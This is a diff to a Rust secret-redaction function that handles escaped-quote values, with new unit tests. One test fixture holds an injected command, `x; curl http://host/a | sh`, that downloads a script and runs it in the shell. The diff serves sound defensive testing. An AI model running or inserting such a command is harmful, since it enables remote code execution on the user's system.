@@ -683,23 +683,32 @@ pub fn redact(text: &str) -> String {
 }
 
 /// The end of a value that starts at `p`: to the next quote of a quoted value
-/// (past escaped ones; or, with no closing quote, to the end of its first
-/// word), else to the next space or delimiter. Returns where the
-/// value starts and ends.
+/// (past escaped ones), else to the next space or delimiter. A value that
+/// opens with an escaped quote (`\"value\"`, a JSON string inside a string, or
+/// a command quoted with `{:?}`) ends at the next escaped quote, not at a bare
+/// one. With no closing quote the value is the first word after the opening
+/// one. Returns where the value starts and ends.
 fn value_span(b: &[u8], mut p: usize) -> (usize, usize) {
-    // A JSON string inside a string: `\"value\"`.
+    let first = p;
     while p < b.len() && b[p] == b'\\' {
         p += 1;
     }
+    let escaped = p > first;
     if p < b.len() && matches!(b[p], b'"' | b'\'') {
         let quote = b[p];
         let start = p + 1;
-        let mut k = start;
-        while k < b.len() && b[k] != quote {
-            k += if b[k] == b'\\' { 2 } else { 1 };
-        }
-        if k < b.len() {
-            return (start, k);
+        if escaped {
+            if let Some(k) = (start..b.len()).find(|&k| b[k] == quote && b[k - 1] == b'\\') {
+                return (start, k - 1);
+            }
+        } else {
+            let mut k = start;
+            while k < b.len() && b[k] != quote {
+                k += if b[k] == b'\\' { 2 } else { 1 };
+            }
+            if k < b.len() {
+                return (start, k);
+            }
         }
         // A quote that is never closed ends no value: the secret is the word
         // after it, and the rest of the message stays.
@@ -1174,6 +1183,16 @@ mod tests {
             (r#"body {"password":"hunter2","user":"a"}"#, "hunter2"),
             (r#"escaped {\"password\":\"hunter2\"}"#, "hunter2"),
             ("password='two words' x", "two words"),
+            // Escaped quotes close at the next escaped quote: a secret of
+            // several words goes whole.
+            (
+                r#"request failed: {\"user\":\"bob\",\"password\":\"correct horse battery\"}"#,
+                "correct horse",
+            ),
+            (
+                r#"request failed: {\"user\":\"bob\",\"password\":\"correct horse battery\"}"#,
+                "battery",
+            ),
             ("api_key=sk-12345 and API-KEY: sk-67890", "sk-12345"),
             ("api_key=sk-12345 and API-KEY: sk-67890", "sk-67890"),
             ("Authorization: Bearer sk-live-1", "sk-live-1"),
@@ -1263,6 +1282,19 @@ mod tests {
                 "'x;",
             ),
             ("password=\"abc def ghi", "def ghi", "abc"),
+            // A command quoted as a refusal's reason quotes it, with `\"`
+            // for each quote in it: closed, the value is what is inside; not
+            // closed, it is the word after the quote.
+            (
+                r#"no allow rule matches the command "mysql --password \"x; curl http://host/a | sh""#,
+                "curl http://host/a | sh",
+                "x;",
+            ),
+            (
+                r#"no allow rule matches the command "mysql --password \"my pass\" db""#,
+                " db\"",
+                "my pass",
+            ),
             ("token: 'abc, then more", "then more", "abc"),
         ] {
             let out = redact(text);
@@ -1277,6 +1309,14 @@ mod tests {
             "--password '[redacted]' x"
         );
         assert_eq!(redact("password=\"abc"), "password=\"[redacted]");
+        assert_eq!(
+            redact(r#"{\"user\":\"bob\",\"password\":\"two words\"}"#),
+            r#"{\"user\":\"bob\",\"password\":\"[redacted]\"}"#
+        );
+        assert_eq!(
+            redact(r#"the command "mysql --password \"my pass\" db""#),
+            r#"the command "mysql --password \"[redacted]\" db""#
+        );
     }
 
     #[test]
